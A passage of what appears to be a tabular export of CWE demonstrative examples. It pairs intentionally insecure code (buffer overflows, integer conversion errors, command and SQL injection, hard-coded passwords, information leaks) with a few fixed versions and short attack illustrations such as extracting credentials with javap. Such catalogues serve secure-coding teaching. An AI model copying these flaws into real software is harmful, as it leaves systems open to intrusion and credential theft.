echo 'Directory name contains invalid sequence';
return;
}

                        
//filter out '~' because other scripts identify user directories by this prefix

                        
$dirName = str_replace('~','',$dirName);
$newDir = $userDir . $dirName;
mkdir($newDir, 0700);
chown($newDir,$userName);
}

               "
182,
183,
184,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public String removeScriptTags(String input, String mask) {
return input.replaceAll(""script"", mask);
}

               "
185,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
$phone = GetPhoneNumber();
if ($phone =~ /\d+-\d+/) {

                        
# looks like it only has hyphens and digits

                        
system(""lookup-phone $phone"");
}
else {
error(""malformed number!"");
}

               "
186,
187,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */

                     

                     
char *username = ""admin"";
char *pass = ""password"";

                     
int AuthenticateUser(char *inUser, char *inPass) {
if (strncmp(username, inUser, strlen(inUser))) {
logEvent(""Auth failure of username using strlen of inUser"");
return(AUTH_FAIL);
}
if (! strncmp(pass, inPass, strlen(inPass))) {
logEvent(""Auth success of password using strlen of inUser"");
return(AUTH_SUCCESS);
}
else {
logEvent(""Auth fail of password using sizeof"");
return(AUTH_FAIL);
}
}

                     
int main (int argc, char **argv) {

                        
int authResult;

                           
if (argc < 3) {
ExitError(""Usage: Provide a username and password"");
}
authResult = AuthenticateUser(argv[1], argv[2]);
if (authResult == AUTH_SUCCESS) {
DoAuthenticatedTask(argv[1]);
}
else {
ExitError(""Authentication failed"");
}

                     
}

               
example: 2
NATURE:attack:
                  
p
pa
pas
pass

               "
188,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void example() {
char a;
char b;
*(&a + 1) = 0;
}

               "
190,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
img_t table_ptr; /*struct containing img data, 10kB each*/
int num_imgs;
...
num_imgs = get_num_imgs();
table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);
...

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
nresp = packet_get_int();
if (nresp > 0) {
response = xmalloc(nresp*sizeof(char*));
for (i = 0; i < nresp; i++) response[i] = packet_get_string(NULL);
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
short int bytesRec = 0;
char buf[SOMEBIGNUM];

                     
while(bytesRec < MAXGET) {
bytesRec += getFromInput(buf+bytesRec);
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#define JAN 1
#define FEB 2
#define MAR 3

                     
short getMonthlySales(int month) {...}

                     
float calculateRevenueForQuarter(short quarterSold) {...}

                     
int determineFirstQuarterRevenue() {

                        

                           

                           
// Variable for sales revenue for the quarter

                           
float quarterRevenue = 0.0f;

                           
short JanSold = getMonthlySales(JAN); /* Get sales in January */
short FebSold = getMonthlySales(FEB); /* Get sales in February */
short MarSold = getMonthlySales(MAR); /* Get sales in March */

                           

                           
// Calculate quarterly total

                           
short quarterSold = JanSold + FebSold + MarSold;

                           

                           
// Calculate the total revenue for the quarter

                           
quarterRevenue = calculateRevenueForQuarter(quarterSold);

                           
saveFirstQuarterRevenue(quarterRevenue);

                           
return 0;

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  
...
float calculateRevenueForQuarter(long quarterSold) {...}

                     
int determineFirstQuarterRevenue() {

                        
...

                           
// Calculate quarterly total

                           
long quarterSold = JanSold + FebSold + MarSold;

                           

                           
// Calculate the total revenue for the quarter

                           
quarterRevenue = calculateRevenueForQuarter(quarterSold);

                           
...

                     
}

               "
191,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <stdbool.h>
main (void)
{
int i;
i = -2147483648;
i = i - 1;
return 0;
}

                  

               "
192,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
DataPacket *packet;
int numHeaders;
PacketHeader *headers;

                     
sock=AcceptSocketConnection();
ReadPacket(packet, sock);
numHeaders =packet->headers;

                     
if (numHeaders > 100) {
ExitError(""too many headers!"");
}
headers = malloc(numHeaders * sizeof(PacketHeader);
ParsePacketHeaders(packet, headers);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int GetUntrustedInt () {
return(0x0000FFFF);
}

                     
void main (int argc, char **argv) {

                        
char path[256];
char *input;
int i;
short s;
unsigned int sz;

                           
i = GetUntrustedInt();
s = i;
/* s is -1 so it passes the safety check - CWE-697 */
if (s > 256) {
DiePainfully(""go away!\n"");
}

                           
/* s is sign-extended and saved in sz */
sz = s;

                           
/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */
printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);

                           
input = GetUserInput(""Enter pathname:"");

                           
/* strncpy interprets s as unsigned int, so it's treated as MAX_INT
(CWE-195), enabling buffer overflow (CWE-119) */
strncpy(path, input, s);
path[255] = '\0'; /* don't want CWE-170 */
printf(""Path is: %s\n"", path);

                     
}

               "
193,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int i;
unsigned int numWidgets;
Widget **WidgetList;

                     
numWidgets = GetUntrustedSizeValue();
if ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {
ExitError(""Incorrect number of widgets requested!"");
}
WidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));
printf(""WidgetList ptr=%p\n"", WidgetList);
for(i=0; i<numWidgets; i++) {
WidgetList[i] = InitializeWidget();
}
WidgetList[numWidgets] = NULL;
showWidgets(WidgetList);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char lastname[20];
char firstname[20];
char name[40];
char fullname[40];

                     
strncat(name, firstname, sizeof(name));
strncat(name, lastname, sizeof(name));
snprintf(fullname, sizeof(fullname), ""%s"", name);

               
example: 3
NATURE:good:
LANGUAGE:C:
                  
char lastname[20];
char firstname[20];
char name[40];
char fullname[40];

                     
strncat(name, firstname, sizeof(name)-1);
strncat(name, lastname, sizeof(name)-1);
snprintf(fullname, sizeof(fullname), ""%s"", name);

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#define PATH_SIZE 60

                     
char filename[PATH_SIZE];

                     
for(i=0; i<=PATH_SIZE; i++) {

                     

                        
char c = getc();
if (c == 'EOF') {
filename[i] = '\0';
}

                           
filename[i] = getc();

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  
for(i=0; i<PATH_SIZE; i++) {
...

               
example: 6
NATURE:bad:
LANGUAGE:C:
                  
int setFilename(char *filename) {
char name[20];
sprintf(name, ""%16s.dat"", filename);
int success = saveFormattedFilenameToDB(name);
return success;
}

               "
194,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int GetUntrustedInt () {
return(0x0000FFFF);
}

                     
void main (int argc, char **argv) {

                        
char path[256];
char *input;
int i;
short s;
unsigned int sz;

                           
i = GetUntrustedInt();
s = i;
/* s is -1 so it passes the safety check - CWE-697 */
if (s > 256) {
DiePainfully(""go away!\n"");
}

                           
/* s is sign-extended and saved in sz */
sz = s;

                           
/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */
printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);

                           
input = GetUserInput(""Enter pathname:"");

                           
/* strncpy interprets s as unsigned int, so it's treated as MAX_INT
(CWE-195), enabling buffer overflow (CWE-119) */
strncpy(path, input, s);
path[255] = '\0'; /* don't want CWE-170 */
printf(""Path is: %s\n"", path);

                     
}

               "
195,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned int readdata () {
int amount = 0;
...
if (result == ERROR)
amount = -1;
...
return amount;
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
unsigned int readdata () {
int amount = 0;
...
amount = accessmainframe();
...
return amount;
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
DataPacket *packet;
int numHeaders;
PacketHeader *headers;

                     
sock=AcceptSocketConnection();
ReadPacket(packet, sock);
numHeaders =packet->headers;

                     
if (numHeaders > 100) {
ExitError(""too many headers!"");
}
headers = malloc(numHeaders * sizeof(PacketHeader);
ParsePacketHeaders(packet, headers);

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
char* processNext(char* strm) {
char buf[512];
short len = *(short*) strm;
strm += sizeof(len);
if (len <= 512) {
memcpy(buf, strm, len);
process(buf);
return strm + len;
}
else {
return -1;
}
}

               
example: 5
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               "
196,
197,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int intPrimitive;
short shortPrimitive;
intPrimitive = (int)(~((int)0) ^ (1 << (sizeof(int)*8-1)));
shortPrimitive = intPrimitive;
printf(""Int MAXINT: %d\nShort MAXINT: %d\n"", intPrimitive, shortPrimitive);

               
example: 2
NATURE:result:
                  
Int MAXINT: 2147483647
Short MAXINT: -1

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
...

                     
// update sales database for number of product sold with product ID

                     
public void updateSalesForProduct(String productID, int amountSold) {

                        

                           

                           
// get the total number of products in inventory database

                           
int productCount = inventory.getProductCount(productID);

                           
// convert integer values to short, the method for the

                           

                           

                           
// sales object requires the parameters to be of type short

                           
short count = (short) productCount;
short sold = (short) amountSold;

                           
// update sales database for product

                           
sales.updateSalesCount(productID, count, sold);

                     
}
...

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
...

                     
// update sales database for number of product sold with product ID

                     
public void updateSalesForProduct(String productID, int amountSold) {

                        

                           

                           
// get the total number of products in inventory database

                           
int productCount = inventory.getProductCount(productID);

                           
// make sure that integer numbers are not greater than

                           

                           

                           
// maximum value for type short before converting

                           
if ((productCount < Short.MAX_VALUE) && (amountSold < Short.MAX_VALUE)) {

                              

                                 

                                 
// convert integer values to short, the method for the

                                 

                                 

                                 
// sales object requires the parameters to be of type short

                                 
short count = (short) productCount;
short sold = (short) amountSold;

                                 
// update sales database for product

                                 
sales.updateSalesCount(productID, count, sold);

                           

                           
else {

                           
// throw exception or perform other processing

                           

                           
...
}

                     
}
...

               "
198,
200,
201,"
example: 1
NATURE:result:
LANGUAGE:SQL:
                  
Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4

               "
202,
203,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $username=param('username');
my $password=param('password');

                     
if (IsValidUsername($username) == 1)
{
if (IsValidPassword($username, $password) == 1)
{
print ""Login Successful"";
}
else
{
print ""Login Failed - incorrect password"";
}
}
else
{
print ""Login Failed - unknown username"";
}

               
example: 2
NATURE:result:
                  
""Login Failed - incorrect username or password""

               "
204,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
my $username=param('username');
my $password=param('password');

                     
if (IsValidUsername($username) == 1)
{
if (IsValidPassword($username, $password) == 1)
{
print ""Login Successful"";
}
else
{
print ""Login Failed - incorrect password"";
}
}
else
{
print ""Login Failed - unknown username"";
}

               
example: 2
NATURE:result:
                  
""Login Failed - incorrect username or password""

               "
205,
206,
207,
208,
209,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
/.../
}
catch (Exception e) {
System.out.println(e);
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
try {
openDbConnection();
}

                     
//print exception message that includes exception message and configuration file location

                     
catch (Exception $e) {
echo 'Caught exception: ', $e->getMessage(), '\n';
echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';
}

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
$ConfigDir = ""/home/myprog/config"";
$uname = GetUserInput(""username"");

                     

                     
# avoid CWE-22, CWE-78, others.

                     
ExitError(""Bad hacker!"") if ($uname !~ /^\w+$/);
$file = ""$ConfigDir/$uname.txt"";
if (! (-e $file)) {
ExitError(""Error: $file does not exist"");
}
...

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
public BankAccount getUserBankAccount(String username, String accountNumber) {

                        
BankAccount userAccount = null;
String query = null;
try {
if (isAuthorizedUser(username)) {
query = ""SELECT * FROM accounts WHERE owner = ""
+ username + "" AND accountID = "" + accountNumber;
DatabaseManager dbManager = new DatabaseManager();
Connection conn = dbManager.getConnection();
Statement stmt = conn.createStatement();
ResultSet queryResult = stmt.executeQuery(query);
userAccount = (BankAccount)queryResult.getObject(accountNumber);
}
} catch (SQLException ex) {
String logMessage = ""Unable to retrieve account information from database,\nquery: "" + query;
Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
}
return userAccount;

                     
}

               "
210,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
$uname = GetUserInput(""username"");

                     

                     

                     
# avoid CWE-22, CWE-78, others.

                     
if ($uname !~ /^\w+$/)
{
ExitError(""Bad hacker!"") ;
}

                     
$filename = ""/home/myprog/config/"" . $uname . "".txt"";
if (!(-e $filename))
{
ExitError(""Error: $filename does not exist"");
}

               "
211,
212,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
// API flag, output JSON if set

                     
$json = $_GET['json']
$username = $_GET['user']
if(!$json)
{

                        
$record = getUserRecord($username);
foreach($record as $fieldName => $fieldValue)
{

                              
if($fieldName == ""email_address"") {

                                    

                                       

                                       
// skip displaying user emails

                                       
continue;

                                 
}
else{
writeToHtmlPage($fieldName,$fieldValue);
}

                           
}

                     
}
else
{
$record = getUserRecord($username);
echo json_encode($record);
}

               "
213,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
Social Security Number: <%= ssn %></br>Credit Card Number: <%= ccn %>

               "
214,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String keystorePass = System.getProperty(""javax.net.ssl.keyStorePassword"");
if (keystorePass == null) {
System.err.println(""ERROR: Keystore password not specified."");
System.exit(-1);
}

                     
...

               "
215,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
<% if (Boolean.getBoolean(""debugEnabled"")) {

                        
%>
User account number: <%= acctNo %>
<%
} %>

                        

                     

                  

               "
216,
219,
220,
221,
222,
223,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function login($userName,$password){

                        
if(authenticate($userName,$password)){
return True;
}
else{
incrementLoginAttempts($userName);
if(recentLoginAttempts($userName) > 5){
writeLog(""Failed login attempt by User: "" . $userName . "" at "" + date('r') );
}
}

                     
}

               "
224,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function readFile($filename){

                        
$user = getCurrentUser();
$realFile = $filename;

                           

                           
//resolve file if its a symbolic link

                           
if(is_link($filename)){
$realFile = readlink($filename);
}

                           
if(fileowner($realFile) == $user){
echo file_get_contents($realFile);
return;
}
else{
echo 'Access denied';
writeLog($user . ' attempted to access the file '. $filename . ' on '. date('r'));
}

                     
}

               "
226,
228,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
229,
230,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
231,
232,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String address = request.getParameter(""address"");
address = address.trim();
String updateString = ""UPDATE shippingInfo SET address='?' WHERE email='cwe@example.com'"";
emailAddress = con.prepareStatement(updateString);
emailAddress.setString(1, address);

               "
233,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
...

                     

                     
public class UrlHandlerReceiver extends BroadcastReceiver {

                        
@Override
public void onReceive(Context context, Intent intent) {

                              
if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {
String URL = intent.getStringExtra(""URLToOpen"");
int length = URL.length();

                                 

                                 
...

                                 
}

                           
}

                     
}

               "
234,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
foo_funct(one, two);

                     
void foo_funct(int one, int two, int three) {
printf(""1) %d\n2) %d\n3) %d\n"", one, two, three);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void some_function(int foo, ...) {
int a[3], i;
va_list ap;
va_start(ap, foo);
for (i = 0; i < sizeof(a) / sizeof(int); i++) a[i] = va_arg(ap, int);
va_end(ap);
}

                     
int main(int argc, char *argv[]) {
some_function(17, 42);
}

               "
235,
236,
237,
238,
239,
240,
241,
242,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char buf[BUFSIZE];
gets(buf);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  

                     
char buf[24];
printf(""Please enter your name and press <Enter>\n"");
gets(buf);
...
}

               "
243,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
chroot(""/var/ftproot"");
...
fgets(filename, sizeof(filename), network);
localfile = fopen(filename, ""r"");
while ((len = fread(buf, 1, sizeof(buf), localfile)) != EOF) {
fwrite(buf, 1, sizeof(buf), network);
}
fclose(localfile);

               "
244,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
cleartext_buffer = get_secret();...
cleartext_buffer = realloc(cleartext_buffer, 1024);
...
scrub_memory(cleartext_buffer, 1024);

               "
245,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class DatabaseConnection {

                        
private static final String CONNECT_STRING = ""jdbc:mysql://localhost:3306/mysqldb"";
private Connection conn = null;

                           
public DatabaseConnection() {
}

                           
public void openDatabaseConnection() {
try {
conn = DriverManager.getConnection(CONNECT_STRING);
} catch (SQLException ex) {...}
}

                           
// Member functions for retrieving database connection and accessing database
...

                     
}

               
example: 2
NATURE:good:
                  
public class DatabaseConnection {

                     

                        
private static final String DB_DATASRC_REF = ""jdbc:mysql://localhost:3306/mysqldb"";
private Connection conn = null;

                           
public DatabaseConnection() {
}

                           
public void openDatabaseConnection() {

                              
try {

                                    
InitialContext ctx = new InitialContext();
DataSource datasource = (DataSource) ctx.lookup(DB_DATASRC_REF);
conn = datasource.getConnection();

                                    

                                 
} catch (NamingException ex) {...}
} catch (SQLException ex) {...}

                           
}

                           
// Member functions for retrieving database connection and accessing database
...

                     
}

               "
246,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                        

                           

                           
// Perform servlet tasks.

                           
...

                           

                           
// Open a socket to a remote server (bad).

                           
Socket sock = null;

                           
try {

                              
sock = new Socket(remoteHostname, 3000);

                                 

                                 
// Do something with the socket.

                                 
...

                           
} catch (Exception e) {
...
}

                     
}

               "
248,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {
String ip = req.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
...
out.println(""hello "" + addr.getHostName());
}

               "
250,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
def makeNewUserDir(username):

                        
if invalidUsername(username):

                              

                                 

                                 
#avoid CWE-22 and CWE-78

                                 
print('Usernames cannot contain invalid characters')
return False

                           

                           
try:
raisePrivileges()
os.mkdir('/home/' + username)
lowerPrivileges()

                           
except OSError:
print('Unable to create new user directory for user:' + username)
return False

                           
return True

                     

                  

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
chroot(APP_HOME);
chdir(""/"");
FILE* data = fopen(argv[1], ""r+"");
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
setTimeZone(userCurrLocation);

               
example: 4
NATURE:bad:
LANGUAGE:XML:
                  
<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
deriveStateFromCoords(userCurrLocation);

               "
252,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char buf[10], cp_buf[10];
fgets(buf, 10, stdin);
strcpy(cp_buf, buf);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int returnChunkSize(void *) {

                        

                           

                           
/* if chunk info is valid, return the size of usable memory,

                           

                           

                           
* else, return -1 to indicate an error

                           

                           

                           
*/

                           
...

                     
}
int main() {
...
memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));
...
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
buf = (char*) malloc(req_size);
strncpy(buf, xfer, req_size);

               
example: 4
NATURE:bad:
LANGUAGE:C#:
                  
char[] byteArray = new char[1024];
for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {
String userName = (String) i.Current();
String pFileName = PFILE_ROOT + ""/"" + userName;
StreamReader sr = new StreamReader(pFileName);
sr.Read(byteArray,0,1024);//the file is always 1k bytes
sr.Close();
processPFile(userName, byteArray);
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {

                        
String userName = (String) i.next();
String pFileName = PFILE_ROOT + ""/"" + userName;
FileInputStream fis = new FileInputStream(pFileName);
fis.read(byteArray); // the file is always 1k bytes
fis.close();
processPFile(userName, byteArray);

                        

                     

                  

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
String itemName = request.getParameter(ITEM_NAME);
if (itemName.compareTo(IMPORTANT_ITEM)) {
...
}
...

               
example: 7
NATURE:bad:
                  
if (itemName.Equals(IMPORTANT_ITEM)) {
...
}
...

               
example: 8
NATURE:bad:
                  
System.clearProperty(""os.name"");
...
String os = System.getProperty(""os.name"");
if (os.equalsIgnoreCase(""Windows 95"")) System.out.println(""Not supported"");

               
example: 9
NATURE:bad:
                  
Dim MyFile As New FileStream(""myfile.txt"", FileMode.Open, FileAccess.Read, FileShare.Read)
Dim MyArray(50) As Byte
MyFile.Read(MyArray, 0, 50)
DoDangerousOperation(MyArray(20))

               
example: 10
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 11
NATURE:bad:
LANGUAGE:C:
                  
void f(pthread_mutex_t *mutex) {

                        
pthread_mutex_lock(mutex);

                           

                           
/* access shared resource */

                           

                           

                           
pthread_mutex_unlock(mutex);

                     
}

               
example: 12
NATURE:good:
                  
int f(pthread_mutex_t *mutex) {

                        
int result;

                           
result = pthread_mutex_lock(mutex);
if (0 != result)
return result;

                           

                           

                           
/* access shared resource */

                           

                           

                           
return pthread_mutex_unlock(mutex);

                     
}

               "
253,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
tmp = malloc(sizeof(int) * 4);
if (tmp < 0 ) {

                        
perror(""Failure"");

                           
//should have checked if the call returned 0

                           

                        

                     
}

               "
256,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
Properties prop = new Properties();
prop.load(new FileInputStream(""config.properties""));
String password = prop.getProperty(""password"");
DriverManager.getConnection(url, usr, password);
...

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
String password = regKey.GetValue(passKey).toString();
NetworkCredential netCred = new NetworkCredential(username,password,domain);
...

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 4
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
257,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {
if (strcmp(compress(password), compressed_password)) {
printf(""Incorrect Password!\n"");
return(0);
}
printf(""Entering Diagnostic Mode...\n"");
return(1);
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
int VerifyAdmin(String password) {
if (passwd.Equals(compress(password), compressed_password)) {
return(0);
}

                        
//Diagnostic Mode

                        
return(1);
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 4
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
258,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=
...

               
example: 2
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
259,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
DriverManager.getConnection(url, ""scott"", ""tiger"");
...

               
example: 2
NATURE:attack:
                  
javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger

                  

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int VerifyAdmin(char *password) {

                        
if (strcmp(password, ""Mew!"")) {

                              

                                 
printf(""Incorrect Password!\n"");
return(0)

                           
}
printf(""Entering Diagnostic Mode...\n"");
return(1);

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
int VerifyAdmin(String password) {
if (!password.equals(""Mew!"")) {
return(0)
}
//Diagnostic Mode
return(1);
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 6
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
260,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
webapp.ldap.username = secretUsername
webapp.ldap.password = secretPassword

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
# Java Web App ResourceBundle properties file

                     
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...

               
example: 3
NATURE:bad:
LANGUAGE:ASP.NET:
                  
...
<connectionStrings>
<add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" />
</connectionStrings>
...

               "
261,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
Properties prop = new Properties();
prop.load(new FileInputStream(""config.properties""));
String password = Base64.decode(prop.getProperty(""password""));
DriverManager.getConnection(url, usr, password);
...

               
example: 2
NATURE:bad:
LANGUAGE:C#:
                  
...
string value = regKey.GetValue(passKey).ToString();
byte[] decVal = Convert.FromBase64String(value);
NetworkCredential netCred = newNetworkCredential(username,decVal.toString(),domain);
...

               "
262,
263,
266,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
seteuid(0);

                     
/* do some stuff */

                     

                     
seteuid(getuid());

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
AccessController.doPrivileged(new PrivilegedAction() {

                        
public Object run() {

                              

                                 

                                 
// privileged code goes here, for example:

                                 
System.loadLibrary(""awt"");
return null;

                                 
// nothing to return

                                 

                              

                           
}

                     

                  

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Intent intent = new Intent();
intent.setAction(""com.example.BackupUserData"");
intent.setData(file_uri);
intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
sendBroadcast(intent);

               
example: 4
NATURE:attack:
LANGUAGE:Java:
                  
public class CallReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
Uri userData = intent.getData();
stealUserData(userData);
}
}

               "
267,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public enum Roles {
ADMIN,USER,GUEST
}

                     
public void printDebugInfo(User requestingUser){

                        
if(isAuthenticated(requestingUser)){

                              
switch(requestingUser.role){

                                    
case GUEST:
System.out.println(""You are not authorized to perform this command"");
break;

                                       
default:
System.out.println(currentDebugState());
break;

                                    

                                 
}

                           
}
else{
System.out.println(""You must be logged in to perform this command"");
}

                     
}

               "
268,"
example: 1
NATURE:bad:
